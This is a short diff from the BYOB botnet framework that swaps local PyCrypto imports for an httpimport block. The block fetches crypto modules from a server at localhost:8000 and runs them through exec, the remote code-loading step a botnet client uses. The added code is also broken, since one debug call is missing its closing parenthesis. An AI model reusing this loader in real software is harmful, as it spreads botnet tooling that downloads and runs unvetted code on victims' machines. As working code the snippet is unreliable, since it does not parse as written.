@@ -5,7 +5,9 @@ https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
+
 # standard library
+
 import os
 import sys
 import json
@@ -14,14 +16,21 @@ import base64
 import socket
 import urllib
 import cStringIO
-import Crypto.Util
-import Crypto.Hash.HMAC
-import Crypto.Cipher.AES
-import Crypto.Hash.SHA256
-import Crypto.PublicKey.RSA
-import Crypto.Cipher.PKCS1_OAEP
+import httpimport
+
 # byob
+
 import util
+
+# remote imports
+
+with httpimport.remote_repo(['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP'], base_url='http://localhost:8000'):
+    for module in ['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']:
+        try:
+            exec "import %s" % module
+        except ImportError:
+            util.debug("Error: unable to import '%s'" % module
+
 
 def diffiehellman(connection):
     if isinstance(connection, socket.socket):
